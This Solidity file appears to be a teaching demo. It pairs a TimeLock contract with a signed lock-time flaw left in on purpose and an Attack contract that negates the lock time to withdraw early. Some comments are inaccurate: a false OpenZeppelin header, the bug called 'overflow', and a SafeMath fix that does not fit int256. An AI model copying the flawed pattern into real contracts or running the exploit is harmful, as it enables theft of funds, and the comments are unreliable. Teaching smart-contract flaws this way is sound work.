// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

import "hardhat/console.sol";

// correction
// import "../utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => int256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = int256(block.timestamp + 1 weeks);
    }

    function increaseLockTime(int256 _secondsToIncrease) external payable {
        
        // incorrect/unsafe method
        // results in lockTime[msg.sender] = 0
        lockTime[msg.sender] += _secondsToIncrease;

        // correct/safe method
        // add function throws error when it detects
        // arithmetic overflow or underflow
        // lockTime[msg.sender] = SafeMath.add(lockTime[msg.sender], _secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient Funds");

        // block.timestamp is used to represent the current timestamp
        // of the block that is being mined.
        require(
            int256(block.timestamp) > lockTime[msg.sender],
            "Insufficient Funds"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        int256 x = int256(timeLock.lockTime(address(this)));
        x *= -1;
        timeLock.increaseLockTime(x);
        timeLock.withdraw();
    }
}
